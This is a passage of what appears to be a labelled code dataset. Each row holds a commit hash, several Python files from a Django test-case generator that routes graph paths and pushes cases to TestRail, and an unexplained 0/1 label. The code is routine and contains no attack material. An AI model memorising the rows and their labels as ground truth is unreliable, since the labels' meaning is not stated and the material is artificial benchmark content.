                                'pre_conditions': path_data['pre_conditions'],
                                'tc_steps': path_data['tc_steps'],
                                'id': edge.id,
                                'title': title,
                            })

                        if edge.to_node.type.name in NODE_MP_NAME:
                            negative_testcase_generation(data, path_data, title, edge.to_node, edge, language=language)
                            if edge.to_node.type.name == NODE_MP_NAME[1]:
                                rejected_testcase_generation(data, path_data, title, edge.to_node, edge, language=language)

    else:
        for edge in edges:
            path = routing_path_to_edge(edge, shortest_set)

            if path:
                path_data = path_traverse_backwards(path, language=language)
                if 'tcs_cannot_route' in path_data.keys():
                    data.append({
                        'tcs_cannot_route': path_data['tcs_cannot_route'],
                        'id': edge.id,
                        'title': 'Route from \'' +
                                 edge.from_node.name +
                                 '\' to \'' +
                                 edge.to_node.name + '\''
                    })
                    print(edge.id)
                else:
                    title = 'Route from \'' + edge.from_node.name +\
                                    '\' to \'' + edge.to_node.name + '\''
                    # edge_id = edge.id,
                    data.append({
                            'pre_conditions': path_data['pre_conditions'],
                            'tc_steps': path_data['tc_steps'],
                            'id': edge.id,
                            'title': title
                        })

                    if edge.to_node.type.name == NODE_MP_NAME[0]:
                        negative_testcase_generation(data, path_data, title, edge.to_node, edge, language=language)

    # return check_subpath_in_all(data)
    return data


def routing_path_to_edge(edge, shortest_set=None):
    """"""
    Routing path to current Edge, edge.from_node
    :param edge:
    :return:
    """"""
    data = routing_path_to_node(edge.from_node, shortest_set)

    if data:
        data.append(edge)
        data.append(edge.to_node)

    # print(data)
    return data


def routing_path_to_node(node, shortest_set=None):
    """"""
    Routing path to current Node
    :param node:
    :return:
    """"""
    path = backwards_search(node, shortest_set)

    # print(path)
    return path


def backwards_search(node, shortest_set=None):
    """"""
    Search a path from Start node(type='Start') to current Node
    Breadth
    :param node:
    :return:
    """"""

    path = []
    start_node_found_outside = False  # flag to find Start Node outside

    if node.type.name in NODE_START_NAME:
        path.append(node)
    else:
        edges = node.arriving_edges
        if edges.count() == 1:
            edge = edges[0]
        elif edges.count() > 1:
            edge = get_shortest_edge_from_arriving_edges(node, shortest_set)
        else:
            edge = None

        if edge:
            start_node_found = False  # flag to find Start Node in current search
            if edge.from_node.type.name not in NODE_START_NAME:
                if edge.from_node.arriving_edges.count() > 0:
                    start_node_found_outside = True
                    path += backwards_search(edge.from_node, shortest_set)
            else:
                start_node_found = True
                path.append(edge.from_node)

            if start_node_found or start_node_found_outside:  # if found Start Node, add Edge
                path.append(edge)
                path.append(node)

    # print('path: ',  path)
    return path


def check_subpath_in_all(all_path):
    """"""
    Find sub paths contained by parent path in all possible paths and remove them
    Use set(a) < set(b) to compare if list_b contains list_a
    :param all_path:
    :return:
    """"""
    data = []
    length = len(all_path)
    for i in range(length):
        for j in range(i + 1, length):
            if set(all_path[i]) < set(all_path[j]) and not check_path_contains_in_result(all_path[j], data):
                data.append(all_path[j])
            elif set(all_path[i]) > set(all_path[j]) and not check_path_contains_in_result(all_path[i], data):
                data.append(all_path[i])

    # check if first path of all_path is in result
    if length > 0 and not check_path_contains_in_result(all_path[0], data):
        data.append(all_path[0])

    return data


def check_path_contains_in_result(path, result):
    """"""
    Check current path is covered in result
    :param path:
    :param result:
    :return:
    """"""
    flag = False
    for i in range(len(result)):
        if set(path) <= set(result[i]):
            flag = True
            break
        else:
            continue

    return flag


def get_shortest_edge_from_arriving_edges(node, shortest_set=None):
    if node.module.project:
        start_nodes = node.module.project.start_nodes
    else:
        start_nodes = node.module.start_nodes

    edge = ''
    for start_node in start_nodes:
        tmp = start_node.name + '-' + node.name
        exist_shortest = next((item for item in shortest_set if item['name'] == tmp), None)
        if exist_shortest:
            path = exist_shortest['path']
        else:
            # print(tmp)
            path = breadth_first_search(start_node, node)
            shortest_set.append({
                'name': tmp,
                'path': path
            })
        for each in path[:-1]:
            edges = Edge.objects.filter(from_node=each, to_node=node)
            if edges.count() > 0:
                edge = edges[0]
            # try:
            #     edge = Edge.objects.get(from_node=each, to_node=node)
            #     return edge
            # except Edge.DoesNotExist:
            #     pass

    return edge


def breadth_first_search(start, end):
    visited = [start]
    queue = collections.deque([start])
    while queue:
        vertex = queue.popleft()
        for child in vertex.children:
            if child not in visited:
                if child == end:
                    visited.append(child)
                    break
                visited.append(child)
                queue.append(child)

    return visited


# --------------- Routing Project/Module Graph End ---------------


# --------------- Routing Test Header Graph End ---------------
def get_paths_from_test_header(th_module):
    """"""
    Search paths from TestHeader and put it between Start Node and next Node
    :param th_module: TestHeader module
    :return: TestHeader route paths
    """"""
    data = []
    if th_module:
        try:
            end_node = Node.objects.get(module=th_module, type__name='TestHeader End')
            for edge in end_node.arriving_edges:
                path = routing_path_to_edge(edge)
                data.append(path)
        except Exception as e:
            print('TestHeader error: ', e)
            pass

    return data
# --------------- Routing Test Header Graph End ---------------


# --------------- TestRail Start ---------------
def get_projects_from_testrail(instance):
    """"""
    Get Projects from TestRail to help adding TestRail Configuration
    :param instance: TestRail instance
    :return: Projects of TestRail
    """"""
    client = APIClient(instance.host)
    client.user = instance.username
    client.password = instance.password

    return client.send_get('get_projects')


def add_testsuite_to_project(client, project_id, suite_name):
    """"""
    Add TestSuite to Project on TestRail
    :param client:
    :param project_id: Project ID of TestRail
    :param suite_name: TestSuite name of TestRail Project, same as MDTA project version name
    :return:
    """"""
    data = {
        'name': suite_name,
        'description': ''
    }

    try:
        suite = client.send_post('add_suite/' + project_id, data)
        return suite
    except APIError as e:
        print('Add Suite Error: ', e)
        return None


def add_section_to_testsuite(client, project_id, suite_id, section_name):
    """"""
    Add section to TestSuite of Testrail project
    :param client:
    :param project_id: Project ID of TestRail
    :param suite_id: TestSuite ID of TestRail Project == MDTA.project.version
    :param section_name: Section name of TestRail-Project-TestSuite == MDTA.project.module.name
    :return:
    """"""
    data = {
        'suite_id': suite_id,
        'name': section_name
    }

    section = client.send_post('add_section/' + project_id, data)

    return str(section['id'])


def remove_section_from_testsuite(client, section_id):
    """"""
    Delete section from TestRail Project
    :param client:
    :param section_id: Section ID == MDTA.project.module
    :return:
    """"""
    client.send_post('delete_section/' + section_id, None)


def add_testcase_to_section(client, section_id, data):
    """"""
    Add Testcases to TestRail.Project.TestSuites.Section
    :param client:
    :param section_id: Section Id == MDTA.project.module
    :param data: TestCases
    :return:
    """"""
    try:
        for each_tc in data:
            if 'tcs_cannot_route' not in each_tc.keys():
                custom_preconds = ''
                for pre_cond in each_tc['pre_conditions']:
                    custom_preconds += pre_cond + '; '

                tc_data = {
                    'title': each_tc['title'],
                    'custom_preconds': custom_preconds,
                    'custom_steps_seperated': each_tc['tc_steps']
                }
                client.send_post('add_case/' + section_id, tc_data)
    except APIError as e:
        print('Add TestCase to Section error: ', e)


# --------------- TestRail End ---------------

/n/n/nmdta/apps/testcases/views.py/n/nimport socket
from django.contrib import messages
from django.contrib.auth.decorators import login_required, user_passes_test
from django.http import HttpResponse
from django.shortcuts import get_object_or_404, render, redirect
import json


from mdta.apps.projects.models import Project, Module, TestRailInstance, TestRailConfiguration
from mdta.apps.projects.utils import context_project_dashboard
from mdta.apps.testcases.models import TestCaseResults
from mdta.apps.testcases.tasks import create_testcases_celery, push_testcases_to_testrail_celery
from mdta.apps.users.views import user_is_superuser, user_is_staff
from .utils import context_testcases, get_projects_from_testrail, create_routing_test_suite
from .forms import TestrailConfigurationForm
from mdta.apps.testcases.testrail import APIClient
from mdta.celery_module import app as celery_app


@login_required
def tcs_project(request):
    if request.user.humanresource.project:
        project = request.user.humanresource.project
        try:
            testcases = project.testcaseresults_set.latest('updated').results
        except TestCaseResults.DoesNotExist:
            testcases = []
    else:
        testcases = []
        project = None

    context = {
        'project': project,
        'testcases': testcases
    }

    if project:
        return render(request, 'testcases/tcs_project.html', context)
    else:
        return redirect('graphs:projects_for_selection')


@user_passes_test(user_is_superuser)
def testcases(request):
    context = context_testcases()

    return render(request, 'testcases/testcases.html', context)


@user_passes_test(user_is_staff)
def create_testcases(request, object_id):
    """"""
    Create TestCases per project/module
    :param request:
    :param object_id: project_id/module_id
    :return:
    """"""

    testcases = []
    link_id = ''
    level = request.GET.get('level', '')
    if level == 'project':
        # create_testcases_celery(object_id, call_from='OldTC')
        project = get_object_or_404(Project, pk=object_id)
        testcases = create_routing_test_suite(project)

    elif level == 'module':
        module = get_object_or_404(Module, pk=object_id)
        link_id = module.project.id
        testcases = create_routing_test_suite(modules=[module])

    context = context_testcases()
    context['testcases'] = testcases
    context['link_id'] = link_id

    return render(request, 'testcases/testcases.html', context)


@user_passes_test(user_is_superuser)
def create_testcases_all(request):
    projects = Project.objects.all()
    for project in projects:
        create_testcases_celery.delay(project.id)

    return redirect('testcases:testcases')


@login_required
def demonstrate_testcases(request, object_id):
    """"""
    Demonstrate TestCases of Project/Module from TestCaseResults
    :param request:
    :param object_id:
    :return:
    """"""
    level = request.GET.get('level', '')
    if level == 'project':
        project = get_object_or_404(Project, pk=object_id)
        link_id = project.id
        try:
            testcases = project.testcaseresults_set.latest('updated').results
        except TestCaseResults.DoesNotExist:
            testcases = []
    elif level == 'module':
        module = get_object_or_404(Module, pk=object_id)
        link_id = module.project.id
        try:
            tmp_tcs = module.project.testcaseresults_set.latest('updated').results
            testcases = [(item for item in tmp_tcs if item['module'] == module.name).__next__()]
        except TestCaseResults.DoesNotExist:
            testcases = []
    else:
        testcases = []
        link_id = ''

    context = context_testcases()
    context['testcases'] = testcases
    context['link_id'] = link_id

    return render(request, 'testcases/testcases.html', context)


@user_passes_test(user_is_staff)
def push_testcases_to_testrail(request, project_id):
    """"""
    Push Testcases of project to TestRail
    :param request:
    :param project_id:
    :return:
    """"""
    testrail_contents = push_testcases_to_testrail_celery.delay(project_id)
    # testrail_contents = push_testcases_to_testrail_celery.delay(project_id)

    context = context_testcases()
    context['testrail'] = testrail_contents
    context['link_id'] = project_id

    return render(request, 'testcases/testcases.html', context)


@user_passes_test(user_is_staff)
def testrail_configuration_new(request):
    if request.method == 'GET':
        context = {
            'form': TestrailConfigurationForm()
        }
        return render(request, 'testcases/tc_testrails_new.html', context)
    elif request.method == 'POST':
        # print(request.POST)

        instance = get_object_or_404(TestRailInstance, username='testrail@west.com')
        testrail_projects = get_projects_from_testrail(instance)

        form = TestrailConfigurationForm(request.POST)
        if form.is_valid():
            suites = []
            testrail_new = form.save(commit=False)
            testrail_find = next(item for item in testrail_projects if item['name'] == testrail_new.project_name)
            testrail_new.project_id = testrail_find['id']

            client = APIClient(testrail_new.instance.host)
            client.user = testrail_new.instance.username
            client.password = testrail_new.instance.password
            testrail_find_suites = client.send_get('get_suites/' + str(testrail_new.project_id))
            for suite in testrail_find_suites:
                suites.append(suite['name'])
            testrail_new.test_suite = suites

            testrail_new.save()
        else:
            messages.error(request, form.errors)

        context = context_project_dashboard(request)
        context['last_tab'] = 'test_rails'

        return render(request, 'projects/project_dashboard.html', context)


@user_passes_test(user_is_superuser)
def testrail_configuration_delete(request, testrail_id):
    testrail = get_object_or_404(TestRailConfiguration, pk=testrail_id)

    testrail.delete()

    context = context_project_dashboard(request)
    context['last_tab'] = 'test_rails'

    return render(request, 'projects/project_dashboard.html', context)


@user_passes_test(user_is_superuser)
def testrail_configuration_update(request, testrail_id):
    suites = []
    testrail = get_object_or_404(TestRailConfiguration, pk=testrail_id)

    client = APIClient(testrail.instance.host)
    client.user = testrail.instance.username
    client.password = testrail.instance.password
    testrail_find_suites = client.send_get('get_suites/' + str(testrail.project_id))
    for suite in testrail_find_suites:
        suites.append(suite['name'])

    if testrail.test_suite != suites:
        testrail.test_suite = suites
        testrail.save()

    context = context_project_dashboard(request)
    context['last_tab'] = 'test_rails'

    return render(request, 'projects/project_dashboard.html', context)


def check_celery_task_state(request):
    task_run = False
    active = celery_app.control.inspect().active()

    # celery worker node name
    key = 'celery@' + socket.gethostname() + '.mdta'
    try:
        if active[key]:
            project_id = active[key][0]['args']
            project_id = ''.join(c for c in project_id if c not in '\'(),')
            if int(project_id) == request.user.humanresource.project.id:
                task_run = True
    except (KeyError, TypeError):
        task_run = True

    return HttpResponse(json.dumps(task_run), content_type='application/json')


/n/n/n",0
191,0772b3cac8c1dffd0c611a30e56c69f106a92ae2,"/mdta/apps/testcases/tasks.py/n/nfrom datetime import datetime
from django.core.exceptions import ValidationError
from django.shortcuts import get_object_or_404

from mdta.celery_module import app
from mdta.apps.projects.models import Project
from mdta.apps.testcases.models import TestCaseResults
from mdta.apps.testcases.utils import create_routing_test_suite, add_testsuite_to_project, remove_section_from_testsuite, \
    add_section_to_testsuite, add_testcase_to_section
from mdta.apps.testcases.testrail import APIClient


@app.task
def create_testcases_celery(project_id, call_from=None):
    """"""
    Create TestCases per project/module
    :param request:
    :param project_id:
    :return:
    """"""

    project = get_object_or_404(Project, pk=project_id)
    testcases = create_routing_test_suite(project=project)

    tc_results = TestCaseResults.objects.filter(project=project)
    if tc_results.count() > 2:
        tc_latest = project.testcaseresults_set.latest('updated')
        if tc_latest.results == testcases:
            tc_latest.updated = datetime.now()
            tc_latest.save()
        else:
            tc_earliest = project.testcaseresults_set.earliest('updated')
            tc_earliest.results = testcases
            tc_earliest.updated = datetime.now()
            tc_earliest.save()
    else:
        try:
            TestCaseResults.objects.create(
                project=project,
                results=testcases
            )
        except (ValueError, ValidationError) as e:
            print(str(e))

    msg = 'TestCases updated.'
    if not call_from:
        msg = push_testcases_to_testrail_celery(project.id)

    return msg


@app.task
def push_testcases_to_testrail_celery(project_id):
    """"""
    Push Testcases of project to TestRail
    :param request:
    :param project_id:
    :return:
    """"""
    project = get_object_or_404(Project, pk=project_id)
    testrail_contents = ''

    try:
        client = APIClient(project.testrail.instance.host)
        client.user = project.testrail.instance.username
        client.password = project.testrail.instance.password

        testrail_contents = client.send_get('get_project/' + project.testrail.project_id)

        tr_suites = client.send_get('get_suites/' + project.testrail.project_id)
        testcases = project.testcaseresults_set.latest('updated').results

        # Find or Create TestSuites in TestRail
        try:
            tr_suite = (suite for suite in tr_suites if suite['name'] == project.version).__next__()
        except StopIteration as e:
            print('Suite: ', e)
            tr_suite = add_testsuite_to_project(client,
                                                project.testrail.project_id,
                                                project.version)
            if not tr_suite:
                raise PermissionError('You are not allowed (Insufficient Permissions)')

        tr_suite_sections = client.send_get('get_sections/' + project.testrail.project_id + '&suite_id=' + str(tr_suite['id']))
        # print(tr_suite_sections)

        # Find or Create Section of TestSuites
        for item in testcases:
            try:
                section = (section for section in tr_suite_sections if section['name'] == item['module']).__next__()
                remove_section_from_testsuite(client, str(section['id']))

                section_id = add_section_to_testsuite(client,
                                                      project.testrail.project_id,
                                                      tr_suite['id'],
                                                      item['module'])

                add_testcase_to_section(client, section_id, item['data'])

            except StopIteration as e:
                print('Section: ', e)
                section_id = add_section_to_testsuite(client,
                                                      project.testrail.project_id,
                                                      tr_suite['id'],
                                                      item['module'])
                add_testcase_to_section(client, section_id, item['data'])

    except AttributeError:
        testrail_contents = {
            'error': 'No TestRail config'
        }

    except (TestCaseResults.DoesNotExist, PermissionError) as e:
        testrail_contents = {
            'error': e
        }

    return testrail_contents

/n/n/n/mdta/apps/testcases/utils.py/n/nimport collections
import time

from mdta.apps.graphs.models import Node, Edge
from mdta.apps.projects.models import Project, TestRailConfiguration
from mdta.apps.testcases.testrail import APIClient, APIError
from mdta.apps.testcases.utils_backwards_traverse import path_traverse_backwards
from mdta.apps.testcases.utils_negative_testcases import negative_testcase_generation, rejected_testcase_generation

from mdta.apps.testcases.constant_names import NODE_START_NAME, NODE_MP_NAME, LANGUAGE_DEFAULT_NAME


def context_testcases():
    """"""
    Retrieve context for tab TestCases
    :return:
    """"""
    context = {
        'projects': Project.objects.all(),
        'testrails': TestRailConfiguration.objects.all(),
    }

    return context


# --------------- Routing Project/Module Graph Start ---------------
def create_routing_test_suite(project=None, modules=None):
    """"""
    Create routing paths for project.modules lists or module lists
    :param project:
    :param modules:
    :return:
    """"""
    data = []

    if project:
        if project.language:
            language = project.language.name
        else:
            language = LANGUAGE_DEFAULT_NAME
        start = time.time()
        data = create_routing_test_suite_module(project.modules, language)
        print(project.name, time.time() - start)
    elif modules:
        if modules[0].project.language:
            language = modules[0].project.language.name
        else:
            language = LANGUAGE_DEFAULT_NAME
        data = create_routing_test_suite_module(modules, language)

    return data


def create_routing_test_suite_module(modules, language):
    """"""
    Create routing paths for list of modules
    :param modules:
    :return:
    """"""
    test_suites = []

    if len(modules) > 0 and modules[0].project.test_header:
        th_module = modules[0].project.test_header
    else:
        th_module = None

    for module in modules:
        start_time = time.time()
        data = get_paths_through_all_edges(module.edges_all, th_module, language)

        test_suites.append({
            'module': module.name,
            'data': data
        })
        print(module.name, time.time() - start_time)

    return test_suites


def get_paths_through_all_edges(edges, th_module=None, language=None):
    """"""
    Get all paths through all edges
    :param edges:
    :return:
    """"""
    th_paths = get_paths_from_test_header(th_module)
    # print(th_paths)

    shortest_set = []  # found shortest set from Start to node, key is 'Start + node', value is list of nodes

    data = []
    if th_paths:
        for th_path in th_paths:
            for edge in edges:
                # print(edge.id)
                start = time.time()
                path = routing_path_to_edge(edge, shortest_set)
                # print(edge.from_node.name, '-', edge.to_node.name, time.time() - start)

                if path:
                    path_data = path_traverse_backwards(path, th_path=th_path, language=language)
                    if 'tcs_cannot_route' in path_data.keys():
                        data.append({
                            'tcs_cannot_route': path_data['tcs_cannot_route'],
                            'id': edge.id,
                            'title': 'Route from \'' +
                                     edge.from_node.name +
                                     '\' to \'' +
                                     edge.to_node.name + '\''
                        })
                    else:
                        title = 'Route from \'' + edge.from_node.name +\
                                    '\' to \'' + edge.to_node.name + '\''
                        # edge_id = edge.id,
                        data.append({
                                'pre_conditions': path_data['pre_conditions'],
                                'tc_steps': path_data['tc_steps'],
                                'id': edge.id,
                                'title': title,
                            })

                        if edge.to_node.type.name in NODE_MP_NAME:
                            negative_testcase_generation(data, path_data, title, edge.to_node, edge, language=language)
                            if edge.to_node.type.name == NODE_MP_NAME[1]:
                                rejected_testcase_generation(data, path_data, title, edge.to_node, edge, language=language)

    else:
        for edge in edges:
            path = routing_path_to_edge(edge, shortest_set)

            if path:
                path_data = path_traverse_backwards(path, language=language)
                if 'tcs_cannot_route' in path_data.keys():
                    data.append({
                        'tcs_cannot_route': path_data['tcs_cannot_route'],
                        'id': edge.id,
                        'title': 'Route from \'' +
                                 edge.from_node.name +
                                 '\' to \'' +
                                 edge.to_node.name + '\''
                    })
                    print(edge.id)
                else:
                    title = 'Route from \'' + edge.from_node.name +\
                                    '\' to \'' + edge.to_node.name + '\''
                    # edge_id = edge.id,
                    data.append({
                            'pre_conditions': path_data['pre_conditions'],
                            'tc_steps': path_data['tc_steps'],
                            'id': edge.id,
                            'title': title
                        })

                    if edge.to_node.type.name == NODE_MP_NAME[0]:
                        negative_testcase_generation(data, path_data, title, edge.to_node, edge, language=language)

    # return check_subpath_in_all(data)
    return data


def routing_path_to_edge(edge, shortest_set=None):
    """"""
    Routing path to current Edge, edge.from_node
    :param edge:
    :return:
    """"""
    data = routing_path_to_node(edge.from_node, shortest_set)

    if data:
        data.append(edge)
        data.append(edge.to_node)

    # print(data)
    return data


def routing_path_to_node(node, shortest_set=None):
    """"""
    Routing path to current Node
    :param node:
    :return:
    """"""
    path = backwards_search(node, shortest_set)

    # print(path)
    return path


def backwards_search(node, shortest_set=None):
    """"""
    Search a path from Start node(type='Start') to current Node
    Breadth
    :param node:
    :return:
    """"""

    path = []
    start_node_found_outside = False  # flag to find Start Node outside

    if node.type.name in NODE_START_NAME:
        path.append(node)
    else:
        edges = node.arriving_edges
        if edges.count() == 1:
            edge = edges[0]
        elif edges.count() > 1:
            edge = get_shortest_edge_from_arriving_edges(node, shortest_set)
        else:
            edge = None

        if edge:
            start_node_found = False  # flag to find Start Node in current search
            if edge.from_node.type.name not in NODE_START_NAME:
                if edge.from_node.arriving_edges.count() > 0:
                    start_node_found_outside = True
                    path += backwards_search(edge.from_node, shortest_set)
            else:
                start_node_found = True
                path.append(edge.from_node)

            if start_node_found or start_node_found_outside:  # if found Start Node, add Edge
                path.append(edge)
                path.append(node)

    # print('path: ',  path)
    return path


def check_subpath_in_all(all_path):
    """"""
    Find sub paths contained by parent path in all possible paths and remove them
    Use set(a) < set(b) to compare if list_b contains list_a
    :param all_path:
    :return:
    """"""
    data = []
    length = len(all_path)
    for i in range(length):
        for j in range(i + 1, length):
            if set(all_path[i]) < set(all_path[j]) and not check_path_contains_in_result(all_path[j], data):
                data.append(all_path[j])
            elif set(all_path[i]) > set(all_path[j]) and not check_path_contains_in_result(all_path[i], data):
                data.append(all_path[i])

    # check if first path of all_path is in result
    if length > 0 and not check_path_contains_in_result(all_path[0], data):
        data.append(all_path[0])

    return data


def check_path_contains_in_result(path, result):
    """"""
    Check current path is covered in result
    :param path:
    :param result:
    :return:
    """"""
    flag = False
    for i in range(len(result)):
        if set(path) <= set(result[i]):
            flag = True
            break
        else:
            continue

    return flag


def get_shortest_edge_from_arriving_edges(node, shortest_set=None):
    if node.module.project:
        start_nodes = node.module.project.start_nodes
    else:
        start_nodes = node.module.start_nodes

    edge = ''
    for start_node in start_nodes:
        tmp = start_node.name + '-' + node.name
        exist_shortest = next((item for item in shortest_set if item['name'] == tmp), None)
        if exist_shortest:
            path = exist_shortest['path']
        else:
            # print(tmp)
            path = breadth_first_search(start_node, node)
            shortest_set.append({
                'name': tmp,
                'path': path
            })
        for each in path[:-1]:
            edges = Edge.objects.filter(from_node=each, to_node=node)
            if edges.count() > 0:
                edge = edges[0]
            # try:
            #     edge = Edge.objects.get(from_node=each, to_node=node)
            #     return edge
            # except Edge.DoesNotExist:
            #     pass

    return edge


def breadth_first_search(start, end):
    visited = [start]
    queue = collections.deque([start])
    while queue:
        vertex = queue.popleft()
        for child in vertex.children:
            if child not in visited:
                if child == end:
                    visited.append(child)
                    break
                visited.append(child)
                queue.append(child)

    return visited


# --------------- Routing Project/Module Graph End ---------------


# --------------- Routing Test Header Graph End ---------------
def get_paths_from_test_header(th_module):
    """"""
    Search paths from TestHeader and put it between Start Node and next Node
    :param th_module: TestHeader module
    :return: TestHeader route paths
    """"""
    data = []
    if th_module:
        try:
            end_node = Node.objects.get(module=th_module, type__name='TestHeader End')
            for edge in end_node.arriving_edges:
                path = routing_path_to_edge(edge)
                data.append(path)
        except Exception as e:
            print('TestHeader error: ', e)
            pass

    return data
# --------------- Routing Test Header Graph End ---------------


# --------------- TestRail Start ---------------
def get_projects_from_testrail(instance):
    """"""
    Get Projects from TestRail to help adding TestRail Configuration
    :param instance: TestRail instance
    :return: Projects of TestRail
    """"""
    client = APIClient(instance.host)
    client.user = instance.username
    client.password = instance.password

    return client.send_get('get_projects')


def add_testsuite_to_project(client, project_id, suite_name):
    """"""
    Add TestSuite to Project on TestRail
    :param client:
    :param project_id: Project ID of TestRail
    :param suite_name: TestSuite name of TestRail Project, same as MDTA project version name
    :return:
    """"""
    data = {
        'name': suite_name,
        'description': ''
    }

    try:
        suite = client.send_post('add_suite/' + project_id, data)
        return suite
    except APIError as e:
        print('Add Suite Error: ', e)
        return None


def add_section_to_testsuite(client, project_id, suite_id, section_name):
    """"""
    Add section to TestSuite of Testrail project
    :param client:
    :param project_id: Project ID of TestRail
    :param suite_id: TestSuite ID of TestRail Project == MDTA.project.version
    :param section_name: Section name of TestRail-Project-TestSuite == MDTA.project.module.name
    :return:
    """"""
    data = {
        'suite_id': suite_id,
        'name': section_name
    }

    section = client.send_post('add_section/' + project_id, data)

    return str(section['id'])


def remove_section_from_testsuite(client, section_id):
    """"""
    Delete section from TestRail Project
    :param client:
    :param section_id: Section ID == MDTA.project.module
    :return:
    """"""
    client.send_post('delete_section/' + section_id, None)


def add_testcase_to_section(client, section_id, data):
    """"""
    Add Testcases to TestRail.Project.TestSuites.Section
    :param client:
    :param section_id: Section Id == MDTA.project.module
    :param data: TestCases
    :return:
    """"""
    try:
        for each_tc in data:
            if 'tcs_cannot_route' not in each_tc.keys():
                custom_preconds = ''
                for pre_cond in each_tc['pre_conditions']:
                    custom_preconds += pre_cond + '; '

                tc_data = {
                    'title': each_tc['title'],
                    'custom_preconds': custom_preconds,
                    'custom_steps_seperated': each_tc['tc_steps']
                }
                client.send_post('add_case/' + section_id, tc_data)
    except APIError as e:
        print('Add TestCase to Section error: ', e)


# --------------- TestRail End ---------------

/n/n/n/mdta/apps/testcases/views.py/n/nimport socket
from django.contrib import messages
from django.contrib.auth.decorators import login_required, user_passes_test
from django.http import HttpResponse
from django.shortcuts import get_object_or_404, render, redirect
import json


from mdta.apps.projects.models import Project, Module, TestRailInstance, TestRailConfiguration
from mdta.apps.projects.utils import context_project_dashboard
from mdta.apps.testcases.models import TestCaseResults
from mdta.apps.testcases.tasks import create_testcases_celery, push_testcases_to_testrail_celery
from mdta.apps.users.views import user_is_superuser, user_is_staff
from .utils import context_testcases, get_projects_from_testrail, create_routing_test_suite
from .forms import TestrailConfigurationForm
from mdta.apps.testcases.testrail import APIClient
from mdta.celery_module import app as celery_app


@login_required
def tcs_project(request):
    if request.user.humanresource.project:
        project = request.user.humanresource.project
        try:
            testcases = project.testcaseresults_set.latest('updated').results
        except TestCaseResults.DoesNotExist:
            testcases = []
    else:
        testcases = []
        project = None

    context = {
        'project': project,
        'testcases': testcases
    }

    if project:
        return render(request, 'testcases/tcs_project.html', context)
    else:
        return redirect('graphs:projects_for_selection')


@user_passes_test(user_is_superuser)
def testcases(request):
    context = context_testcases()

    return render(request, 'testcases/testcases.html', context)


@user_passes_test(user_is_staff)
def create_testcases(request, object_id):
    """"""
    Create TestCases per project/module
    :param request:
    :param object_id: project_id/module_id
    :return:
    """"""

    testcases = []
    link_id = ''
    level = request.GET.get('level', '')
    if level == 'project':
        create_testcases_celery(object_id, call_from='OldTC')

    elif level == 'module':
        module = get_object_or_404(Module, pk=object_id)
        link_id = module.project.id
        testcases = create_routing_test_suite(modules=[module])

    context = context_testcases()
    context['testcases'] = testcases
    context['link_id'] = link_id

    return render(request, 'testcases/testcases.html', context)


@user_passes_test(user_is_superuser)
def create_testcases_all(request):
    projects = Project.objects.all()
    for project in projects:
        create_testcases_celery.delay(project.id)

    return redirect('testcases:testcases')


@login_required
def demonstrate_testcases(request, object_id):
    """"""
    Demonstrate TestCases of Project/Module from TestCaseResults
    :param request:
    :param object_id:
    :return:
    """"""
    level = request.GET.get('level', '')
    if level == 'project':
        project = get_object_or_404(Project, pk=object_id)
        link_id = project.id
        try:
            testcases = project.testcaseresults_set.latest('updated').results
        except TestCaseResults.DoesNotExist:
            testcases = []
    elif level == 'module':
        module = get_object_or_404(Module, pk=object_id)
        link_id = module.project.id
        try:
            tmp_tcs = module.project.testcaseresults_set.latest('updated').results
            testcases = [(item for item in tmp_tcs if item['module'] == module.name).__next__()]
        except TestCaseResults.DoesNotExist:
            testcases = []
    else:
        testcases = []
        link_id = ''

    context = context_testcases()
    context['testcases'] = testcases
    context['link_id'] = link_id

    return render(request, 'testcases/testcases.html', context)


@user_passes_test(user_is_staff)
def push_testcases_to_testrail(request, project_id):
    """"""
    Push Testcases of project to TestRail
    :param request:
    :param project_id:
    :return:
    """"""
    testrail_contents = push_testcases_to_testrail_celery.delay(project_id)
    # testrail_contents = push_testcases_to_testrail_celery.delay(project_id)

    context = context_testcases()
    context['testrail'] = testrail_contents
    context['link_id'] = project_id

    return render(request, 'testcases/testcases.html', context)


@user_passes_test(user_is_staff)
def testrail_configuration_new(request):
    if request.method == 'GET':
        context = {
            'form': TestrailConfigurationForm()
        }
        return render(request, 'testcases/tc_testrails_new.html', context)
    elif request.method == 'POST':
        # print(request.POST)

        instance = get_object_or_404(TestRailInstance, username='testrail@west.com')
        testrail_projects = get_projects_from_testrail(instance)

        form = TestrailConfigurationForm(request.POST)
        if form.is_valid():
            suites = []
            testrail_new = form.save(commit=False)
            testrail_find = next(item for item in testrail_projects if item['name'] == testrail_new.project_name)
            testrail_new.project_id = testrail_find['id']

            client = APIClient(testrail_new.instance.host)
            client.user = testrail_new.instance.username
            client.password = testrail_new.instance.password
            testrail_find_suites = client.send_get('get_suites/' + str(testrail_new.project_id))
            for suite in testrail_find_suites:
                suites.append(suite['name'])
            testrail_new.test_suite = suites

            testrail_new.save()
        else:
            messages.error(request, form.errors)

        context = context_project_dashboard(request)
        context['last_tab'] = 'test_rails'

        return render(request, 'projects/project_dashboard.html', context)


@user_passes_test(user_is_superuser)
def testrail_configuration_delete(request, testrail_id):
    testrail = get_object_or_404(TestRailConfiguration, pk=testrail_id)

    testrail.delete()

    context = context_project_dashboard(request)
    context['last_tab'] = 'test_rails'

    return render(request, 'projects/project_dashboard.html', context)


@user_passes_test(user_is_superuser)
def testrail_configuration_update(request, testrail_id):
    suites = []
    testrail = get_object_or_404(TestRailConfiguration, pk=testrail_id)

    client = APIClient(testrail.instance.host)
    client.user = testrail.instance.username
    client.password = testrail.instance.password
    testrail_find_suites = client.send_get('get_suites/' + str(testrail.project_id))
    for suite in testrail_find_suites:
        suites.append(suite['name'])

    if testrail.test_suite != suites:
        testrail.test_suite = suites
        testrail.save()

    context = context_project_dashboard(request)
    context['last_tab'] = 'test_rails'

    return render(request, 'projects/project_dashboard.html', context)


def check_celery_task_state(request):
    task_run = False
    active = celery_app.control.inspect().active()

    # celery worker node name
    key = 'celery@' + socket.gethostname() + '.mdta'
    try:
        if active[key]:
            project_id = active[key][0]['args']
            project_id = ''.join(c for c in project_id if c not in '\'(),')
            if int(project_id) == request.user.humanresource.project.id:
                task_run = True
    except (KeyError, TypeError):
        task_run = True

    return HttpResponse(json.dumps(task_run), content_type='application/json')


/n/n/n",1
192,c498663b4582d41430bc54f79670ea5306ffdab8,"odin/resources.py/n/n# -*- coding: utf-8 -*-
import copy
import six
from odin import exceptions, registration
from odin.exceptions import ValidationError
from odin.fields import NOT_PROVIDED
from odin.utils import cached_property, field_iter_items


DEFAULT_TYPE_FIELD = '$'
